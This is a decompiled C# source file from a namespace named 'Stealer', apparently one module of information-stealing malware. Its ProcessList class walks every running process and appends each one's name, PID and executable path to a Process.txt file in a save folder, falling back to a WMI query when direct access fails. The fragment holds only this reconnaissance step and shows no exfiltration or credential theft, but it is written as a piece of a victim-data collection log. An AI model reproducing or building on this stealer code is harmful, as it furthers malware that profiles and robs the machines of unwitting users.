using System;
using System.Diagnostics;
using System.IO;
using System.Management;

namespace Stealer
{
	// Token: 0x0200001A RID: 26
	internal sealed class ProcessList
	{
		// Token: 0x0600008D RID: 141 RVA: 0x00005700 File Offset: 0x00003900
		public static void WriteProcesses(string sSavePath)
		{
			foreach (Process process in Process.GetProcesses())
			{
				File.AppendAllText(sSavePath + "\\Process.txt", string.Concat(new string[]
				{
					"NAME: ",
					process.ProcessName,
					"\n\tPID: ",
					process.Id.ToString(),
					"\n\tEXE: ",
					ProcessList.ProcessExecutablePath(process),
					"\n\n"
				}));
			}
		}

		// Token: 0x0600008E RID: 142 RVA: 0x00005784 File Offset: 0x00003984
		public static string ProcessExecutablePath(Process process)
		{
			try
			{
				return process.MainModule.FileName;
			}
			catch
			{
				foreach (ManagementBaseObject managementBaseObject in new ManagementObjectSearcher("SELECT ExecutablePath, ProcessID FROM Win32_Process").Get())
				{
					ManagementObject managementObject = (ManagementObject)managementBaseObject;
					object obj = managementObject["ProcessID"];
					object obj2 = managementObject["ExecutablePath"];
					if (obj2 != null && obj.ToString() == process.Id.ToString())
					{
						return obj2.ToString();
					}
				}
			}
			return "";
		}
	}
}
